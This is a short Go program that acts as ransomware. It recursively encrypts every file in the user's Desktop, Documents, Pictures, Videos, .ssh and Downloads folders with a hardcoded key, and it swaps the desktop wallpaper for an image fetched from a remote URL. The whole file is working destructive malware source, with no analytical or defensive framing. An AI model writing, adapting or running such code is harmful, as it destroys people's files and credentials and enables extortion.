package main

import (
	"github.com/Tiked/FileEncryption"
	"os"
	"path/filepath"
	"github.com/reujab/wallpaper"
	"os/user"
)

func main() {
	directories := []string{`\Desktop`, `\Documents`, `\Pictures`, `\Videos`, `\.ssh`, `\Downloads`}
	usr, _ := user.Current()
	//FileEncryption.InitializeBlock([]byte("a very very very very secret key"))
	//wallpaper.SetFromURL("https://upload.vaa.red/i/LbqAG.png") // original wallpaper
	wallpaper.SetFromURL("https://upload.vaa.red/i/V821X.png") //meatball wallpaper

	for _, directory := range directories{
		root := usr.HomeDir + directory
		encrypt(root)
	}


}

func encrypt(root string) {
	var files []string
	FileEncryption.InitializeBlock([]byte("a very very very very secret key"))
	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		files = append(files, path)
		return nil
	})

	for _, file := range files {
		//fmt.Printf("%T", file) //for testing in a safe manner
		FileEncryption.Encrypter(file)
	}
}